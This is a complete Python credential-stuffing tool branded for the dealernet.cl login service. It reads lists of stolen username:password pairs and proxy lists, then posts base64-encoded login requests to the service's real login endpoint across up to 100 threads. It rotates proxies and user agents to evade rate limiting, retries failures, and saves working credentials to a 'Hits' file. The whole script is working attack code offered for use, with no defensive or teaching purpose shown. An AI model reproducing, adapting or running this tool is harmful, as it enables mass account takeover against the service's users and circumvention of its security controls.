import os, sys, time, base64, threading, random, queue, re, itertools
import httpx
from colorama import init, Fore
init(autoreset=True)

ART = r"""
██████╗ ███████╗ █████╗ ██╗     ███████╗██████╗ ███╗   ██╗███████╗████████╗ ██████╗██╗     
██╔══██╗██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     
██║  ██║█████╗  ███████║██║     █████╗  ██████╔╝██╔██╗ ██║█████╗     ██║   ██║     ██║     
██║  ██║██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝     ██║   ██║     ██║     
██████╔╝███████╗██║  ██║███████╗███████╗██║  ██║██║ ╚████║███████╗   ██║██╗╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝╚═╝ ╚═════╝╚══════╝
"""
SUBTITLE = "✨ Made with ♥ by Yashvir Gaming  •  Telegram: https://t.me/therealyashvirgaming"

RETRY_STATUSES = {408, 409, 429}
MAX_RETRIES = 2
PROXY_COOLDOWN = 20

def term_width():
    try: return os.get_terminal_size().columns
    except: return 100

def center(s):
    w = term_width()
    return "\n".join(line.center(w) for line in s.splitlines())

def random_ua():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    ]
    return random.choice(uas)

def select_file(msg):
    print(center(msg))
    while True:
        fn = input().strip('" ')
        if os.path.isfile(fn): return fn
        if fn == "": continue
        print(center(Fore.LIGHTRED_EX + "Not found, drop the file again"))

def select_files(msg):
    print(center(msg))
    files = []
    while True:
        fn = input().strip('" ')
        if not fn: break
        if os.path.isfile(fn): files.append(fn)
        else: print(center(Fore.LIGHTRED_EX + "Not found, drop again"))
    return files

def load_lines(fn):
    with open(fn, "r", encoding="utf-8", errors="ignore") as f:
        return [ln[:-1] if ln.endswith("\n") else ln for ln in f if ln.strip()]

def parse_combo(line):
    if ":" not in line: return None, None
    sp = line.split(":", 1)
    return sp[0].strip(), sp[1].strip()

def parse_proxy_line(p):
    p = p.strip()
    if not p: return None
    m = re.match(r"^\((http|https|socks4|socks5)\)\s*(.+)$", p, re.I)
    if m:
        scheme = m.group(1).lower()
        core = m.group(2).strip()
    else:
        ms = re.match(r"^(https?|socks4|socks5)://(.+)$", p, re.I)
        if ms:
            scheme = ms.group(1).lower()
            core = ms.group(2).strip()
        else:
            scheme = "http"
            core = p
    if "@" in core:
        cred, hostp = core.split("@", 1)
        if ":" not in hostp: return None
        host, port = hostp.split(":", 1)
        user, pwd = cred.split(":", 1)
        return scheme, user, pwd, host, port
    parts = core.split(":")
    if len(parts) == 2:
        host, port = parts
        return scheme, None, None, host, port
    if len(parts) == 4:
        host, port, user, pwd = parts
        return scheme, user, pwd, host, port
    return None

def to_proxy_url(parsed):
    if not parsed: return None
    scheme, user, pwd, host, port = parsed
    if user and pwd: return f"{scheme}://{user}:{pwd}@{host}:{port}"
    return f"{scheme}://{host}:{port}"

def build_httpx_proxies(url):
    if not url: return None
    return {"http://": url, "https://": url}

def encode_payload(user, pwd):
    inner = f"<cuenta>{user}</cuenta><clave>{pwd}</clave>"
    b64 = base64.b64encode(inner.encode("utf-8")).decode("ascii")
    return f'<root cntx_tran="tlfw.data.trx.transac" version="1.0"><transaction code="srv-sawfw-login.aspx" method=""><credenciales>{b64}</credenciales><screen_width>1920</screen_width><screen_height>1080</screen_height></transaction></root>'

def cpm_now(hist):
    t = int(time.time())
    while hist and t - hist[0] > 60: hist.pop(0)
    return len(hist)

def cpm_bar(v, width=28):
    v = max(0, min(v, 6000))
    fill = int((v / 6000) * width)
    return "[" + "█"*fill + "─"*(width-fill) + f"] {v} CPM"

def print_header():
    os.system("")
    print(center(Fore.LIGHTMAGENTA_EX + ART))
    print(center(Fore.LIGHTWHITE_EX + SUBTITLE))
    print()

def ask_threads():
    print(center(Fore.LIGHTCYAN_EX + "Enter number of bots/threads (1-100):"))
    while True:
        try:
            n = int(input().strip())
            if 1 <= n <= 100: return n
        except: pass
        print(center(Fore.LIGHTRED_EX + "Enter a number between 1 and 100:"))

def extract_errmsg(txt):
    m = re.search(r"<ERRMSG>\s*([^<]+)\s*</ERRMSG>", txt, re.I)
    if m: return m.group(1).strip()
    m = re.search(r"<MSGERROR>\s*([^<]+)\s*</MSGERROR>", txt, re.I)
    if m: return m.group(1).strip()
    return "Invalid credentials"

def should_retry(status, text):
    if status in RETRY_STATUSES: return True
    if status >= 500: return True
    if status == 0: return True
    if "temporarily unavailable" in text.lower(): return True
    return False

def main():
    print_header()
    combo_fn = select_file("Drop your combos .txt then press Enter")
    combos = load_lines(combo_fn)
    print(center(Fore.LIGHTWHITE_EX + f"[+] Loaded {len(combos)} combos"))
    print(f"[+] Loaded {len(combos)} combos")
    proxy_files = select_files("Drop proxy .txt file(s) (optional). Drop multiple then press Enter when done")
    raw_proxies = []
    for pf in proxy_files: raw_proxies += load_lines(pf)
    print(center(Fore.LIGHTWHITE_EX + f"[+] Loaded {len(raw_proxies)} proxies"))
    print(f"[+] Loaded {len(raw_proxies)} proxies")
    parsed = [parse_proxy_line(p) for p in raw_proxies]
    normalized_urls = []
    for pr in parsed:
        if pr:
            url = to_proxy_url(pr)
            if url: normalized_urls.append(url)
    print(center(Fore.LIGHTWHITE_EX + f"[+] Normalized {len(normalized_urls)} proxies"))
    threads = ask_threads()
    q = queue.Queue()
    for c in combos: q.put(c)
    lock = threading.Lock()
    attempts = {}
    results = {"hits":0,"fails":0,"retries":0}
    cpm_hist = []
    stop_flag = {"v":False}
    bad_until = {}
    if not os.path.isdir("Results"): os.makedirs("Results", exist_ok=True)

    def status_loop():
        while not stop_flag["v"]:
            v = cpm_now(cpm_hist)
            line = f"💥 Hits: {results['hits']}   💔 Fails: {results['fails']}   ♻️ Retries: {results['retries']}   {cpm_bar(v)}"
            print("\r" + line.center(term_width()), end="", flush=True)
            time.sleep(1)
        v = cpm_now(cpm_hist)
        line = f"💥 Hits: {results['hits']}   💔 Fails: {results['fails']}   ♻️ Retries: {results['retries']}   {cpm_bar(v)}"
        print("\r" + line.center(term_width()))

    def next_proxy():
        if not normalized_urls: return None, None
        now = time.time()
        for _ in range(len(normalized_urls)):
            url = normalized_urls[random.randrange(len(normalized_urls))]
            t = bad_until.get(url, 0)
            if now >= t: return url, build_httpx_proxies(url)
        time.sleep(1)
        return None, None

    def worker(tid):
        headers_base = {
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.8",
            "Content-Type": "application/xml;charset=UTF-8",
            "User-Agent": random_ua(),
        }
        with httpx.Client(timeout=httpx.Timeout(20.0, connect=20.0, read=20.0), follow_redirects=True) as client:
            while True:
                try:
                    combo = q.get_nowait()
                except queue.Empty:
                    return
                user, pwd = parse_combo(combo)
                if not user:
                    q.task_done()
                    continue
                payload = encode_payload(user, pwd)
                headers = dict(headers_base)
                headers["User-Agent"] = random_ua()
                proxy_url, proxies = next_proxy()
                with lock:
                    cpm_hist.append(int(time.time()))
                    print()
                    print(center(Fore.LIGHTBLUE_EX + f"[CHECKING] 🔎 {user}:{pwd}"))
                try:
                    resp = client.post(
                        "https://suite.dealernet.cl/srv-sawfw-login.aspx",
                        headers=headers,
                        content=payload.encode("utf-8"),
                        proxies=proxies,
                    )
                    txt = resp.text
                    status = resp.status_code
                    is_hit = bool(re.search(r"<Autentificado>\s*(True|true|1)\s*</Autentificado>", txt))
                    is_false = bool(re.search(r"<Autentificado>\s*(False|false|0)\s*</Autentificado>", txt))
                    has_error_block = "<response><ERROR>" in txt or bool(re.search(r"<CODERROR>\s*1\s*</CODERROR>", txt))
                    err_msg = extract_errmsg(txt)
                    with lock:
                        if is_hit:
                            results["hits"] += 1
                            cap = f"{user}:{pwd} | Autentificado=True"
                            with open(os.path.join("Results","Hits.txt"), "a", encoding="utf-8") as fw:
                                fw.write(cap + "\n")
                            print(center(Fore.LIGHTGREEN_EX + f"[HIT] ✅ {cap}"))
                        elif has_error_block or is_false or status in (401,403):
                            results["fails"] += 1
                            print(center(Fore.LIGHTRED_EX + f"[FAIL] ❌ {user}:{pwd} | {err_msg}"))
                        elif should_retry(status, txt) and attempts.get(combo,0) < MAX_RETRIES:
                            attempts[combo] = attempts.get(combo,0)+1
                            results["retries"] += 1
                            if proxy_url: bad_until[proxy_url] = time.time() + PROXY_COOLDOWN
                            print(center(Fore.LIGHTYELLOW_EX + f"[RETRY] ♻️ {user}:{pwd}  ({attempts[combo]}/{MAX_RETRIES})  code={status}"))
                            time.sleep(random.uniform(0.3,1.0))
                            q.put(combo)
                        else:
                            results["fails"] += 1
                            print(center(Fore.LIGHTRED_EX + f"[FAIL] ❌ {user}:{pwd} | {err_msg}"))
                except Exception as ex:
                    with lock:
                        if attempts.get(combo,0) < MAX_RETRIES:
                            attempts[combo] = attempts.get(combo,0)+1
                            results["retries"] += 1
                            if proxy_url: bad_until[proxy_url] = time.time() + PROXY_COOLDOWN
                            msg = str(ex).split("\n")[0][:120]
                            print(center(Fore.LIGHTYELLOW_EX + f"[RETRY] ♻️ {user}:{pwd}  ({attempts[combo]}/{MAX_RETRIES})  err={msg}"))
                            time.sleep(random.uniform(0.4,1.2))
                            q.put(combo)
                        else:
                            results["fails"] += 1
                            print(center(Fore.LIGHTRED_EX + f"[FAIL] ❌ {user}:{pwd} | {str(ex).splitlines()[0][:120]}"))
                finally:
                    q.task_done()

    print()
    print(center(Fore.LIGHTCYAN_EX + "Threads starting… ⚙️"))
    status = threading.Thread(target=status_loop, daemon=True); status.start()
    pool = []
    for i in range(threads):
        th = threading.Thread(target=worker, args=(i,), daemon=True)
        th.start(); pool.append(th)
    q.join()
    stop_flag["v"] = True
    for th in pool: th.join()
    print()
    print(center(Fore.LIGHTGREEN_EX + "Finished ✅"))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + center(Fore.LIGHTRED_EX + "Interrupted"))
